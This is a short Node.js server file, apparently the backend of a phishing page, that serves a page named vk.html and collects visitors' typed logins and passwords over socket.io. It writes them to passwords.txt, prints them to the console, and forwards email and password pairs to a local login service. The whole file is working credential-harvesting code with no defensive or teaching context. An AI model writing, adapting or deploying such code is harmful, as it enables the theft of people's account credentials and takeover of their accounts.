var app = require('express')();
var http = require('http').Server(app);
var io = require('socket.io')(http);
var fs = require('fs');
var request = require('request');

app.get('/', function (req, res) {
    res.sendFile(__dirname + '/vk.html');
});

io.on('connection', function (socket) {
    console.log('a user connected');
    socket.on('disconnect', function () {
        console.log('user disconnected');
    });

    socket.on('LOGIN_INPUT', function (data) {
        console.log("LOGIN: " + data)
        fs.appendFile("./passwords.txt", "\n" + "LOGIN: " + data, function (err) {
            if (err) {
                return console.log(err);
            }
        });
    })

    socket.on('PASSWORD_INPUT', function (data) {
        console.log("PASSWORD: " + data)

        fs.appendFile("./passwords.txt", "\n" + "PASSWORD: " + data, function (err) {
            if (err) {
                return console.log(err);
            }
        });
    })

    socket.on('USER_NAME', function(data){
        console.log('The user with name ' + data + ' connected!')
    })

    socket.on('FINISH', function(data){
        var email = data.email
        var password = data.password

        request.get('http://localhost:8080/login/' + email + '/' + password, {}, function(){})

        console.log("FINISHED: " + email + ' : ' + password)
    })
});

http.listen(3000, function () {
    console.log('listening on *:3000');
});
